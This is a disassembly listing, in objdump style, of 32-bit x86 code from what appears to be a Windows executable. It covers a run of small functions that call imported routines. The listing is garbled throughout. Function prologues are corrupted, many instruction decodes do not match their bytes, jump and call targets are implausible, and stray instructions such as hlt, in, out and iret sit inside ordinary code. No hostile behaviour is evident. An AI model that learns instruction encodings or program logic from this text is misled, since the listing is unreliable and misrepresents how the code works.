  40a26d:	33 9d 0f 5d 7d f8    	xor    -0x782a2f1(%ebp),%ebx
  40a273:	00 90 90 90 3a 90    	add    %dl,-0x6fc56f70(%eax)
  40a279:	90                   	nop
  40a27a:	90                   	nop
  40a27b:	90                   	nop
  40a27c:	90                   	nop
  40a27d:	90                   	nop
  40a27e:	90                   	nop
  40a27f:	90                   	nop
  40a280:	55                   	push   %ebp
  40a281:	32 ec                	xor    %ah,%ch
  40a283:	68 45 08 8b 48       	push   $0x488b0845
  40a288:	04 85                	add    $0x85,%al
  40a28a:	c9                   	leave
  40a28b:	c5 15 1c 40 04 ff    	lds    0xff04401c,%edx
  40a291:	96                   	xchg   %eax,%esi
  40a292:	ff                   	(bad)
  40a293:	ff 83 c0 0c f6 ff    	incl   -0x9f340(%ebx)
  40a299:	15 3c c0 40 00       	adc    $0x40c03c,%eax
  40a29e:	bf c0 5d c3 8b       	mov    $0x8bc35dc0,%edi
  40a2a3:	40                   	inc    %eax
  40a2a4:	08 15 ff 15 74 c0    	or     %dl,0xc07415ff
  40a2aa:	40                   	inc    %eax
  40a2ab:	00 85 5d 75 ea 56    	add    %al,0x56ea755d(%ebp)
  40a2b1:	8b f7                	mov    %edi,%esi
  40a2b3:	98                   	cwtl
  40a2b4:	c0 40 00 bb          	rolb   $0xbb,0x0(%eax)
  40a2b8:	d6                   	salc
  40a2b9:	77 ef                	ja     0x40a2aa
  40a2bb:	75 04                	jne    0x40a2c1
  40a2bd:	5e                   	pop    %esi
  40a2be:	5d                   	pop    %ebp
  40a2bf:	c3                   	ret
  40a2c0:	ff d6                	call   *%esi
  40a2c2:	3e 80 fc 0a          	ds cmp $0xa,%ah
  40a2c6:	00 5e 5d             	add    %bl,0x5d(%esi)
  40a2c9:	c3                   	ret
  40a2ca:	90                   	nop
  40a2cb:	90                   	nop
  40a2cc:	90                   	nop
  40a2cd:	e7 90                	out    %eax,$0x90
  40a2cf:	90                   	nop
  40a2d0:	55                   	push   %ebp
  40a2d1:	8b ec                	mov    %esp,%ebp
  40a2d3:	8b 45 08             	mov    0x8(%ebp),%eax
  40a2d6:	8b 48 04             	mov    0x4(%eax),%ecx
  40a2d9:	85 c9                	test   %ecx,%ecx
  40a2db:	75 10                	jne    0x40a2ed
  40a2dd:	cf                   	iret
  40a2de:	c0 0c 50 ff          	rorb   $0xff,(%eax,%edx,2)
  40a2e2:	b5 34                	mov    $0x34,%ch
  40a2e4:	c0 40 00 33          	rolb   $0x33,0x0(%eax)
  40a2e8:	c0 5d c2 04          	rcrb   $0x4,-0x3e(%ebp)
  40a2ec:	b5 8b                	mov    $0x8b,%ch
  40a2ee:	40                   	inc    %eax
  40a2ef:	08 85 ff 50 ff 15    	or     %al,0x15ff50ff(%ebp)
  40a2f5:	9c                   	pushf
  40a2f6:	2d 40 00 85 c0       	sub    $0xc0850040,%eax
  40a2fb:	74 ea                	je     0x40a2e7
  40a2fd:	20 80 00 00 00 74    	and    %al,0x74000000(%eax)
  40a303:	fa                   	cli
  40a304:	3d 02 01 00 00       	cmp    $0x102,%eax
  40a309:	71 2c                	jno    0x40a337
  40a30b:	0a b8 89 fb 12 05    	or     0x512fb89(%eax),%bh
  40a311:	5e                   	pop    %esi
  40a312:	5d                   	pop    %ebp
  40a313:	5e                   	pop    %esi
  40a314:	04 00                	add    $0x0,%al
  40a316:	17                   	pop    %ss
  40a317:	35 98 c0 40 00       	xor    $0x40c098,%eax
  40a31c:	ff d6                	call   *%esi
  40a31e:	85 c0                	test   %eax,%eax
  40a320:	2c dc                	sub    $0xdc,%al
  40a322:	5e                   	pop    %esi
  40a323:	5d                   	pop    %ebp
  40a324:	b9 04 b1 4a d6       	mov    $0xd64ab104,%ecx
  40a329:	04 80                	add    $0x80,%al
  40a32b:	fc                   	cld
  40a32c:	0a 3a                	or     (%edx),%bh
  40a32e:	5e                   	pop    %esi
  40a32f:	5d                   	pop    %ebp
  40a330:	c2 04 00             	ret    $0x4
  40a333:	90                   	nop
  40a334:	90                   	nop
  40a335:	90                   	nop
  40a336:	90                   	nop
  40a337:	90                   	nop
  40a338:	90                   	nop
  40a339:	90                   	nop
  40a33a:	4e                   	dec    %esi
  40a33b:	90                   	nop
  40a33c:	90                   	nop
  40a33d:	90                   	nop
  40a33e:	90                   	nop
  40a33f:	90                   	nop
  40a340:	55                   	push   %ebp
  40a341:	66 ec                	data16 in (%dx),%al
  40a343:	8b 4d 9e             	mov    -0x62(%ebp),%ecx
  40a346:	56                   	push   %esi
  40a347:	8b 41 04             	mov    0x4(%ecx),%eax
  40a34a:	85 c0                	test   %eax,%eax
  40a34c:	e1 6d                	loope  0x40a3bb
  40a34e:	83 c1 0c             	add    $0xc,%ecx
  40a351:	51                   	push   %ecx
  40a352:	56                   	push   %esi
  40a353:	2e 2c c0             	cs sub $0xc0,%al
  40a356:	91                   	xchg   %eax,%ecx
  40a357:	00 33                	add    %dh,(%ebx)
  40a359:	35 25 40 c2 fa       	xor    $0xfac24025,%eax
  40a35e:	00 62 f8             	add    %ah,-0x8(%edx)
  40a361:	08 75 0c             	or     %dh,0xc(%ebp)
  40a364:	8b 41 08             	mov    0x8(%ecx),%eax
  40a367:	50                   	push   %eax
  40a368:	ff 15 30 c0 40 00    	call   *0x40c030
  40a36e:	eb 0f                	jmp    0x40a37f
  40a370:	83 03 02             	addl   $0x2,(%ebx)
  40a373:	75 e3                	jne    0x40a358
  40a375:	c9                   	leave
  40a376:	49                   	dec    %ecx
  40a377:	08 ef                	or     %ch,%bh
  40a379:	ff 15 34 c0 40 69    	call   *0x6940c034
  40a37f:	85 2e                	test   %ebp,(%esi)
  40a381:	75 d5                	jne    0x40a358
  40a383:	8b 35 98 c0 40 00    	mov    0x40c098,%esi
  40a389:	ff d6                	call   *%esi
  40a38b:	c5 f8 74             	(bad)
  40a38e:	c9                   	leave
  40a38f:	3f                   	aas
  40a390:	c8 05 80 fc          	enter  $0x8005,$0xfc
  40a394:	0a ce                	or     %dh,%cl
  40a396:	5e                   	pop    %esi
  40a397:	5d                   	pop    %ebp
  40a398:	c2 04 00             	ret    $0x4
  40a39b:	90                   	nop
  40a39c:	90                   	nop
  40a39d:	2e 90                	cs nop
  40a39f:	90                   	nop
  40a3a0:	55                   	push   %ebp
  40a3a1:	8b 24 8b             	mov    (%ebx,%ecx,4),%esp
  40a3a4:	45                   	inc    %ebp
  40a3a5:	08 b7 80 a2 40 00    	or     %dh,0x40a280(%edi)
  40a3ab:	27                   	daa
  40a3ac:	8b 00                	mov    (%eax),%eax
  40a3ae:	50                   	push   %eax
  40a3af:	e8 0c 5a ff ff       	call   0x3ffdc0
  40a3b4:	b6 c6                	mov    $0xc6,%dh
  40a3b6:	04 68                	add    $0x68,%al
  40a3b8:	f7 9c 90 90 90 90 90 	negl   -0x6f6f6f70(%eax,%edx,4)
  40a3bf:	90                   	nop
  40a3c0:	33 c0                	xor    %eax,%eax
  40a3c2:	c2 04 00             	ret    $0x4
  40a3c5:	90                   	nop
  40a3c6:	90                   	nop
  40a3c7:	83 90 90 90 90 90 90 	adcl   $0xffffff90,-0x6f6f6f70(%eax)
  40a3ce:	90                   	nop
  40a3cf:	90                   	nop
  40a3d0:	26 8b ec             	es mov %esp,%ebp
  40a3d3:	8b 45 08             	mov    0x8(%ebp),%eax
  40a3d6:	8b 40 b4             	mov    -0x4c(%eax),%eax
  40a3d9:	25 49 74 33 8b       	and    $0x8b337449,%eax
  40a3de:	4d                   	dec    %ebp
  40a3df:	0c 51                	or     $0x51,%al
  40a3e1:	50                   	push   %eax
  40a3e2:	ff 15 28 c0 40 00    	call   *0x40c028
  40a3e8:	20 c0                	and    %al,%al
  40a3ea:	75 d7                	jne    0x40a3c3
  40a3ec:	56                   	push   %esi
  40a3ed:	8b 35 15 4e da 00    	mov    0xda4e15,%esi
  40a3f3:	ff 87 85 c0 75 05    	incl   0x575c085(%edi)
  40a3f9:	5e                   	pop    %esi
  40a3fa:	5d                   	pop    %ebp
  40a3fb:	de 08                	fimuls (%eax)
  40a3fd:	7b ff                	jnp    0x40a3fe
  40a3ff:	d6                   	salc
  40a400:	05 80 fc 0a 00       	add    $0xafc80,%eax
  40a405:	5e                   	pop    %esi
  40a406:	5d                   	pop    %ebp
  40a407:	8f 08 fa 33          	(bad)
  40a40b:	c0 5d c2 08          	rcrb   $0x8,-0x3e(%ebp)
  40a40f:	00 b8 c4 4e 00 00    	add    %bh,0x4ec4(%eax)
  40a415:	5d                   	pop    %ebp
  40a416:	c2 9a 00             	ret    $0x9a
  40a419:	90                   	nop
  40a41a:	90                   	nop
  40a41b:	90                   	nop
  40a41c:	90                   	nop
  40a41d:	f9                   	stc
  40a41e:	90                   	nop
  40a41f:	64 c3                	fs ret
  40a421:	90                   	nop
  40a422:	90                   	nop
  40a423:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40a424:	e1 0d                	loope  0x40a433
  40a426:	90                   	nop
  40a427:	90                   	nop
  40a428:	df c5                	ffreep %st(5)
  40a42a:	90                   	nop
  40a42b:	90                   	nop
  40a42c:	90                   	nop
  40a42d:	90                   	nop
  40a42e:	90                   	nop
  40a42f:	28 55 8b             	sub    %dl,-0x75(%ebp)
  40a432:	ec                   	in     (%dx),%al
  40a433:	83 3d dc 08 41 00 14 	cmpl   $0x14,0x4108dc
  40a43a:	7c 23                	jl     0x40a45f
  40a43c:	68 28 19 41 00       	push   $0x411928
  40a441:	ff 15 20 c0 40 78    	call   *0x7840c020
  40a447:	8b 45 08             	mov    0x8(%ebp),%eax
  40a44a:	68 20 57 40 77       	push   $0x77405720
  40a44f:	68 70 e6 40 ac       	push   $0xac40e670
  40a454:	68 08 07 41 00       	push   $0x410708
  40a459:	50                   	push   %eax
  40a45a:	9b                   	fwait
  40a45b:	a1 a2 ff ff 33       	mov    0x33ffffa2,%eax
  40a460:	c0 fb c3             	sar    $0xc3,%bl
  40a463:	90                   	nop
  40a464:	6d                   	insl   (%dx),%es:(%edi)
  40a465:	90                   	nop
  40a466:	b7 90                	mov    $0x90,%bh
  40a468:	90                   	nop
  40a469:	90                   	nop
  40a46a:	90                   	nop
  40a46b:	8f 68 7c 90          	(bad)
  40a46f:	92                   	xchg   %eax,%edx
  40a470:	68 28 07 7b 00       	push   $0x7b0728
  40a475:	ff 15 3c c0 b4 84    	call   *0x84b4c03c
  40a47b:	33 c0                	xor    %eax,%eax
  40a47d:	c3                   	ret
  40a47e:	82 90 55 8b ec 8d 45 	adcb   $0x45,-0x721374ab(%eax)
  40a485:	08 42 c8             	or     %al,-0x38(%edx)
  40a488:	81 e1 00 c8 00 c0    	and    $0xc000c800,%ecx
  40a48e:	81 62 00 e7 00 c0 75 	andl   $0x75c000e7,0x0(%edx)
  40a495:	0c a9                	or     $0xa9,%al
  40a497:	00 00                	add    %al,(%eax)
  40a499:	ff                   	(bad)
  40a49a:	3f                   	aas
  40a49b:	b8 02 00 f5 00       	mov    $0xf50002,%eax
  40a4a0:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40a4a1:	05 b8 01 00 00       	add    $0x1b8,%eax
  40a4a6:	7e 5d                	jle    0x40a505
  40a4a8:	c3                   	ret
  40a4a9:	90                   	nop
  40a4aa:	90                   	nop
  40a4ab:	90                   	nop
  40a4ac:	90                   	nop
  40a4ad:	90                   	nop
  40a4ae:	90                   	nop
  40a4af:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40a4b0:	55                   	push   %ebp
  40a4b1:	8b 90 8b 45 14 56    	mov    0x5614458b(%eax),%edx
  40a4b7:	8b 75 08             	mov    0x8(%ebp),%esi
  40a4ba:	f7 ed                	imul   %ebp
  40a4bc:	1b c0                	sbb    %eax,%eax
  40a4be:	6a a2                	push   $0xffffffa2
  40a4c0:	48                   	dec    %eax
  40a4c1:	50                   	push   %eax
  40a4c2:	8b 46 14             	mov    0x14(%esi),%eax
  40a4c5:	50                   	push   %eax
  40a4c6:	ff 15 9c c0 40 00    	call   *0x40c09c
  40a4cc:	85 c0                	test   %eax,%eax
  40a4ce:	89 45 14             	mov    %eax,0x14(%ebp)
  40a4d1:	75 4b                	jne    0x40a51e
  40a4d3:	8b 56 14             	mov    0x14(%esi),%edx
  40a4d6:	8d                   	lea    (bad),%edx
  40a4d7:	d2 14 51             	rclb   %cl,(%ecx,%edx,2)
  40a4da:	22 ff                	and    %bh,%bh
  40a4dc:	15 24 c0 40 00       	adc    $0x40c024,%eax
  40a4e1:	85 c0                	test   %eax,%eax
  40a4e3:	74 4a                	je     0x40a52f
  40a4e5:	8b 45 0c             	mov    0xc(%ebp),%eax
  40a4e8:	8b f3                	mov    %ebx,%esi
  40a4ea:	14 85                	adc    $0x85,%al
  40a4ec:	c0 c3 02             	rol    $0x2,%bl
  40a4ef:	89 08                	mov    %ecx,(%eax)
  40a4f1:	8b 55 10             	mov    0x10(%ebp),%edx
  40a4f4:	85 d2                	test   %edx,%edx
  40a4f6:	74 0b                	je     0x40a503
  40a4f8:	51                   	push   %ecx
  40a4f9:	d6                   	salc
  40a4fa:	82 ff ff             	cmp    $0xff,%bh
  40a4fd:	ff 1a                	lcall  *(%edx)
  40a4ff:	63 cf                	arpl   %ecx,%edi
  40a501:	5a                   	pop    %edx
  40a502:	2d 7a 46 14 50       	sub    $0x5014467a,%eax
  40a507:	ff 15 74 c0 40 00    	call   *0x40c074
  40a50d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40a50e:	46                   	inc    %esi
  40a50f:	30 ae 00 00 00 b8    	xor    %ch,-0x48000000(%esi)
  40a515:	75 11                	jne    0x40a528
  40a517:	01 25 5e 5d c2 10    	add    %esp,0x10c25d5e
  40a51d:	00 3d db 01 00 00    	add    %bh,0x1db
  40a523:	83 76 b8 76          	xorl   $0x76,-0x48(%esi)
  40a527:	11 01                	adc    %eax,(%ecx)
  40a529:	00 5e 5d             	add    %bl,0x5d(%esi)
  40a52c:	ff 10                	call   *(%eax)
  40a52e:	00 8b 35 98 3f 40    	add    %cl,0x403f9835(%ebx)
  40a534:	ca c5 d6             	lret   $0xd6c5
  40a537:	85 c0                	test   %eax,%eax
  40a539:	75 05                	jne    0x40a540
  40a53b:	5e                   	pop    %esi
  40a53c:	5d                   	pop    %ebp
  40a53d:	01 10                	add    %edx,(%eax)
  40a53f:	00 ff                	add    %bh,%bh
  40a541:	08 05 fb fc 0a 27    	or     %al,0x270afcfb
  40a547:	5e                   	pop    %esi
  40a548:	da c2                	fcmovb %st(2),%st
  40a54a:	10 00                	adc    %al,(%eax)
  40a54c:	90                   	nop
  40a54d:	90                   	nop
  40a54e:	90                   	nop
  40a54f:	90                   	nop
  40a550:	5f                   	pop    %edi
  40a551:	4f                   	dec    %edi
  40a552:	ec                   	in     (%dx),%al
  40a553:	8b 17                	mov    (%edi),%edx
  40a555:	10 53 45             	adc    %dl,0x45(%ebx)
  40a558:	08 85 c9 dc 6f 1c    	or     %al,0x1c6fdcc9(%ebp)
  40a55e:	8d 74 08 ff          	lea    -0x1(%eax,%ecx,1),%esi
  40a562:	3b c6                	cmp    %esi,%eax
  40a564:	73 c3                	jae    0x40a529
  40a566:	8b 55 0c             	mov    0xc(%ebp),%edx
  40a569:	8a 0a                	mov    (%edx),%cl
  40a56b:	84 c9                	test   %cl,%cl
  40a56d:	62 08                	bound  %ecx,(%eax)
  40a56f:	74 d8                	je     0x40a549
  40a571:	40                   	inc    %eax
  40a572:	42                   	inc    %edx
  40a573:	78 c6                	js     0x40a53b
  40a575:	91                   	xchg   %eax,%ecx
  40a576:	f2 c6 00 00          	repnz movb $0x0,(%eax)
  40a57a:	5e                   	pop    %esi
  40a57b:	5d                   	pop    %ebp
  40a57c:	c2 0c 00             	ret    $0xc
  40a57f:	90                   	nop
  40a580:	55                   	push   %ebp
  40a581:	8b ec                	mov    %esp,%ebp
  40a583:	53                   	push   %ebx
  40a584:	77 1d                	ja     0x40a5a3
  40a586:	00 c1                	add    %al,%cl
  40a588:	40                   	inc    %eax
  40a589:	00 56 57             	add    %dl,0x57(%esi)
  40a58c:	8b 7d 08             	mov    0x8(%ebp),%edi
  40a58f:	6a 2f                	push   $0x2f
  40a591:	57                   	push   %edi
  40a592:	ff d3                	call   *%ebx
  40a594:	6a 5c                	push   $0x5c
  40a596:	57                   	push   %edi
  40a597:	8b c6                	mov    %esi,%eax
  40a599:	ff d3                	call   *%ebx
  40a59b:	7b c4                	jnp    0x40a561
  40a59d:	10 c2                	adc    %al,%dl
  40a59f:	da 76 02             	fidivl 0x2(%esi)
  40a5a2:	8b d7                	mov    %edi,%edx
  40a5a4:	85 f6                	test   %esi,%esi
  40a5a6:	55                   	push   %ebp
  40a5a7:	8e 6a 3a             	mov    0x3a(%edx),%gs
  40a5aa:	57                   	push   %edi
  40a5ab:	30 7f 8b             	xor    %bh,-0x75(%edi)
  40a5ae:	32 83 6a 08 85 3e    	xor    0x3e85086a(%ebx),%al
  40a5b4:	8d 0a                	lea    (%edx),%ecx
  40a5b6:	8d 46 01             	lea    0x1(%esi),%eax
  40a5b9:	5f                   	pop    %edi
  40a5ba:	5e                   	pop    %esi
  40a5bb:	fe 89 c2 d1 00 8b    	decb   -0x74ff2e3e(%ecx)
  40a5c1:	f0 5f                	lock pop %edi
  40a5c3:	5e                   	pop    %esi
  40a5c4:	5b                   	pop    %ebx
  40a5c5:	5d                   	pop    %ebp
  40a5c6:	c2 04 00             	ret    $0x4
  40a5c9:	90                   	nop
  40a5ca:	90                   	nop
  40a5cb:	fa                   	cli
  40a5cc:	90                   	nop
  40a5cd:	90                   	nop
  40a5ce:	90                   	nop
  40a5cf:	90                   	nop
  40a5d0:	55                   	push   %ebp
  40a5d1:	8b ec                	mov    %esp,%ebp
  40a5d3:	83 ec 18             	sub    $0x18,%esp
  40a5d6:	bd 8b f1 10 85       	mov    $0x8510f18b,%ebp
  40a5db:	db 57 96             	fistl  -0x6a(%edi)
  40a5de:	45                   	inc    %ebp
  40a5df:	fc                   	cld
  40a5e0:	00 f4                	add    %dh,%ah
  40a5e2:	73 00                	jae    0x40a5e4
  40a5e4:	7d 13                	jge    0x40a5f9
  40a5e6:	8b 45 0c             	mov    0xc(%ebp),%eax
  40a5e9:	80 f4 c4             	xor    $0xc4,%ah
  40a5ec:	38 00                	cmp    %al,(%eax)
  40a5ee:	74 09                	je     0x40a5f9
  40a5f0:	13 4c 98 04          	adc    0x4(%eax,%ebx,4),%ecx
  40a5f4:	43                   	inc    %ebx
  40a5f5:	ae                   	scas   %es:(%edi),%al
  40a5f6:	c9                   	leave
  40a5f7:	8a f7                	mov    %bh,%dh
  40a5f9:	8d 04 9d 04 00 00 00 	lea    0x4(,%ebx,4),%eax
  40a600:	56                   	push   %esi
  40a601:	50                   	push   %eax
  40a602:	dc 15 5c c1 40 00    	fcoml  0x40c15c
  40a608:	83 83 04 8b f8 85 db 	addl   $0xffffffdb,-0x7a0774fc(%ebx)
  40a60f:	b4 7d                	mov    $0x7d,%ah
  40a611:	32 7e 6a             	xor    0x6a(%esi),%bh
  40a614:	8b 45 0c             	mov    0xc(%ebp),%eax
  40a617:	b9 f7 2b c7 40       	mov    $0x40c72bf7,%ecx
  40a61c:	5d                   	pop    %ebp
  40a61d:	f8                   	clc
  40a61e:	89 45 10             	mov    %eax,0x10(%ebp)
  40a621:	eb 03                	jmp    0x40a626
  40a623:	8b 45 10             	mov    0x10(%ebp),%eax
  40a626:	8b 0c 30             	mov    (%eax,%esi,1),%ecx
  40a629:	51                   	push   %ecx
  40a62a:	ff 15 0c c1 40 00    	call   *0x40c10c
  40a630:	83 c4 e6             	add    $0xffffffe6,%esp
  40a633:	40                   	inc    %eax
  40a634:	89 06                	mov    %eax,(%esi)
  40a636:	8b 92 be ca d0 8b    	mov    -0x742f3542(%edx),%edx
  40a63c:	45                   	inc    %ebp
  40a63d:	9c                   	pushf
  40a63e:	df c6                	ffreep %st(6)
  40a640:	04 48                	add    $0x48,%al
  40a642:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40a645:	89 45 a5             	mov    %eax,-0x5b(%ebp)
  40a648:	75 d9                	jne    0x40a623
  40a64a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a64d:	e5 a8                	in     $0xa8,%eax
  40a64f:	40                   	inc    %eax
  40a650:	01 50 89             	add    %edx,-0x77(%eax)
  40a653:	92                   	xchg   %eax,%edx
  40a654:	fc                   	cld
  40a655:	62 15 5c c1 82 00    	bound  %edx,0x82c15c
  40a65b:	83 c4 0d             	add    $0xd,%esp
  40a65e:	01 c9                	add    %ecx,%ecx
  40a660:	85 db                	test   %ebx,%ebx
  40a662:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40a665:	8b 82 7e 54 8b 45    	mov    0x458b547e(%edx),%eax
  40a66b:	75 4b                	jne    0x40a6b8
  40a66d:	4d                   	dec    %ebp
  40a66e:	f4                   	hlt
  40a66f:	b0 c1                	mov    $0xc1,%al
  40a671:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40a674:	89 60 10             	mov    %esp,0x10(%eax)
  40a677:	89 5d 0c             	mov    %ebx,0xc(%ebp)
  40a67a:	89 38                	mov    %edi,(%eax)
  40a67c:	e8 eb 03 9d 45       	call   0x45ddaa6c
  40a681:	f3 8b 17             	repz mov (%edi),%edx
  40a684:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  40a687:	8d 4d 22             	lea    0x22(%ebp),%ecx
  40a68a:	89 82 f0 89 37 8b    	mov    %eax,-0x74c87610(%edx)
  40a690:	04 5c                	add    $0x5c,%al
  40a692:	51                   	push   %ecx
  40a693:	8d 41 f0             	lea    -0x10(%ecx),%eax
  40a696:	56                   	push   %esi
  40a697:	52                   	push   %edx
  40a698:	50                   	push   %eax
  40a699:	28 52 05             	sub    %dl,0x5(%edx)
  40a69c:	00 00                	add    %al,(%eax)
  40a69e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40a6a1:	8b 79 ec             	mov    -0x14(%ecx),%edi
  40a6a4:	8f 02                	pop    (%edx)
  40a6a6:	83 c7 04             	add    $0x4,%edi
  40a6a9:	03 f0                	add    %eax,%esi
  40a6ab:	8b 45 6f             	mov    0x6f(%ebp),%eax
  40a6ae:	48                   	dec    %eax
  40a6af:	89 45 0c             	mov    %eax,0xc(%ebp)
  40a6b2:	75 cb                	jne    0x40a67f
  40a6b4:	8b 7d f4             	mov    -0xc(%ebp),%edi
  40a6b7:	8b 67 1f             	mov    0x1f(%edi),%esp
  40a6ba:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40a6bd:	c7 04 8f 00 00 00 00 	movl   $0x0,(%edi,%ecx,4)
  40a6c4:	c6 06 00             	movb   $0x0,(%esi)
  40a6c7:	2b f0                	sub    %eax,%esi
  40a6c9:	46                   	inc    %esi
  40a6ca:	56                   	push   %esi
  40a6cb:	50                   	push   %eax
  40a6cc:	ff 15 20 c1 40 00    	call   *0x40c120
  40a6d2:	8b 5e f8             	mov    -0x8(%esi),%ebx
  40a6d5:	83 c4 85             	add    $0xffffff85,%esp
  40a6d8:	78 05                	js     0x40a6df
  40a6da:	5e                   	pop    %esi
  40a6db:	74 f8                	je     0x40a6d5
  40a6dd:	2b 68 8b             	sub    -0x75(%eax),%ebp
  40a6e0:	c8 33 c0 c1          	enter  $0xc033,$0xc1
  40a6e4:	db 7e 1a             	fstpt  0x1a(%esi)
  40a6e7:	8b 14 06             	mov    (%esi,%eax,1),%edx
  40a6ea:	3f                   	aas
  40a6eb:	d1 89 14 87 40 3b    	rorl   $1,0x3b408714(%ecx)
  40a6f1:	c3                   	ret
  40a6f2:	7c f3                	jl     0x40a6e7
  40a6f4:	13 4d 08             	adc    0x8(%ebp),%ecx
  40a6f7:	8b c3                	mov    %ebx,%eax
  40a6f9:	89 39                	mov    %edi,(%ecx)
  40a6fb:	5f                   	pop    %edi
  40a6fc:	5b                   	pop    %ebx
  40a6fd:	8b e5                	mov    %ebp,%esp
  40a6ff:	5d                   	pop    %ebp
  40a700:	c3                   	ret
  40a701:	e2 55                	loop   0x40a758
  40a703:	93                   	xchg   %eax,%ebx
  40a704:	52                   	push   %edx
  40a705:	c3                   	ret
  40a706:	87 3a                	xchg   %edi,(%edx)
  40a708:	5f                   	pop    %edi
  40a709:	5b                   	pop    %ebx
  40a70a:	8b e5                	mov    %ebp,%esp
  40a70c:	5d                   	pop    %ebp
  40a70d:	c3                   	ret
  40a70e:	8b 45 08             	mov    0x8(%ebp),%eax
  40a711:	89 38                	mov    %edi,(%eax)
  40a713:	4b                   	dec    %ebx
  40a714:	c3                   	ret
  40a715:	5f                   	pop    %edi
  40a716:	af                   	scas   %es:(%edi),%eax
  40a717:	8b e5                	mov    %ebp,%esp
  40a719:	9f                   	lahf
  40a71a:	c3                   	ret
  40a71b:	90                   	nop
  40a71c:	90                   	nop
  40a71d:	90                   	nop
  40a71e:	39 90 55 8b ec a1    	cmp    %edx,-0x5e1374ab(%eax)
  40a724:	dc 08                	fmull  (%eax)
  40a726:	ac                   	lods   %ds:(%esi),%al
  40a727:	00 56 85             	add    %dl,-0x7b(%esi)
  40a72a:	eb 57                	jmp    0x40a783
  40a72c:	0f 85 e9 01 00 00    	jne    0x40a91b
  40a732:	68 f8 07 41 00       	push   $0x4107f8
  40a737:	c7 05 f8 07 41 77 94 	movl   $0x94,0x774107f8
  40a73e:	00 00 00 
  40a741:	ff 15 20 c0 40 00    	call   *0x40c020
  40a747:	af                   	scas   %es:(%edi),%eax
  40a748:	0d f5 41 00 83       	or     $0x830041f5,%eax
  40a74d:	f8                   	clc
  40a74e:	02 dc                	add    %ah,%bl
  40a750:	85 38                	test   %edi,(%eax)
  40a752:	9d                   	popf
  40a753:	00 00                	add    %al,(%eax)
  40a755:	3b 0c 08             	cmp    (%eax,%ecx,1),%ecx
  40a758:	41                   	inc    %ecx
  40a759:	00 39                	add    %bh,(%ecx)
  40a75b:	0c 08                	or     $0x8,%al
  40a75d:	41                   	inc    %ecx
  40a75e:	48                   	dec    %eax
  40a75f:	84 9f 74 3b 6c 3d    	test   %bl,0x3d6c3b74(%edi)
  40a765:	68 c1 40 00 a1       	push   $0xa10040c1
  40a76a:	74 c1                	je     0x40a72d
  40a76c:	40                   	inc    %eax
  40a76d:	00 83 38 01 dd 0e    	add    %al,0xedd0138(%ebx)
  40a773:	33 c9                	xor    %ecx,%ecx
  40a775:	6a 3d                	push   $0x3d
  40a777:	8a 0e                	mov    (%esi),%cl
  40a779:	51                   	push   %ecx
  40a77a:	ff d7                	call   *%edi
  40a77c:	83 c4 08             	add    $0x8,%esp
  40a77f:	eb 11                	jmp    0x40a792
  40a781:	a1 78 c1 40 00       	mov    0x40c178,%eax
  40a786:	33 d2                	xor    %edx,%edx
  40a788:	8a 16                	mov    (%esi),%dl
  40a78a:	45                   	inc    %ebp
  40a78b:	08 8a 04 51 83 a6    	or     %cl,-0x597caefc(%edx)
  40a791:	04 85                	add    $0x85,%al
  40a793:	c0 75 6d 8a          	shlb   $0x8a,0x6d(%ebp)
  40a797:	c8 01 46 dd          	enter  $0x4601,$0xdd
  40a79b:	c0 75 cb 8b          	shlb   $0x8b,-0x35(%ebp)
  40a79f:	db e0                	fneni(8087 only)
  40a7a1:	08 41 00             	or     %al,0x0(%ecx)
  40a7a4:	a1 2e 07 51 6b       	mov    0x6b51072e,%eax
  40a7a9:	83 f8 03             	cmp    $0x3,%eax
  40a7ac:	0f 69 5f 01          	punpckhwd 0x1(%edi),%mm3
  40a7b0:	e2 00                	loop   0x40a7b2
  40a7b2:	9f                   	lahf
  40a7b3:	84 59 01             	test   %bl,0x1(%ecx)
  40a7b6:	00 00                	add    %al,(%eax)
  40a7b8:	83 f8 04             	cmp    $0x4,%eax
  40a7bb:	75 65                	jne    0x40a822
  40a7bd:	83 52 02 73          	adcl   $0x73,0x2(%edx)
  40a7c1:	23 b8 28 00 00 00    	and    0x28(%eax),%edi
  40a7c7:	e9 4a 01 00 00       	jmp    0x40a916
  40a7cc:	80 3e 00             	cmpb   $0x0,(%esi)
  40a7cf:	74 cd                	je     0x40a79e
  40a7d1:	56                   	push   %esi
  40a7d2:	ff 15 6c 6a 40 00    	call   *0x406a6c
  40a7d8:	8b c8                	mov    %eax,%ecx
  40a7da:	83 c4 04             	add    $0x4,%esp
  40a7dd:	89 0d 2c 08 41 4d    	mov    %ecx,0x4d41082c
  40a7e3:	eb 70                	jmp    0x40a855
  40a7e5:	1c 08                	sbb    $0x8,%al
  40a7e7:	b8 2a 00 d0 00       	mov    $0xd0002a,%eax
  40a7ec:	e9 ed 01 00 dd       	jmp    0xdd40a9de
  40a7f1:	83 f9 03             	cmp    $0x3,%ecx
  40a7f4:	77 0a                	ja     0x40a800
  40a7f6:	61                   	popa
  40a7f7:	2b 00                	sub    (%eax),%eax
  40a7f9:	00 00                	add    %al,(%eax)
  40a7fb:	e9 16 01 67 00       	jmp    0xa7a916
  40a800:	83 f9 04             	cmp    $0x4,%ecx
  40a803:	77 0a                	ja     0x40a80f
  40a805:	b8 2c 00 00 00       	mov    $0x2c,%eax
  40a80a:	e9 07 01 00 00       	jmp    0x40a916
  40a80f:	0e                   	push   %cs
  40a810:	05 00 00 24 3b       	add    $0x3b240000,%eax
  40a815:	2b 1b                	sub    (%ebx),%ebx
  40a817:	01 f7                	add    %esi,%edi
  40a819:	d8 83 c0 2d e9 f4    	fadds  -0xb16d240(%ebx)
  40a81f:	00 00                	add    %al,(%eax)
  40a821:	bc 83 0a 05 ec       	mov    $0xec050a83,%esp
  40a826:	55                   	push   %ebp
  40a827:	a1 00 42 41 7b       	mov    0x7b414200,%eax
  40a82c:	85 c0                	test   %eax,%eax
  40a82e:	75 f8                	jne    0x40a828
  40a830:	17                   	pop    %ss
  40a831:	5f                   	pop    %edi
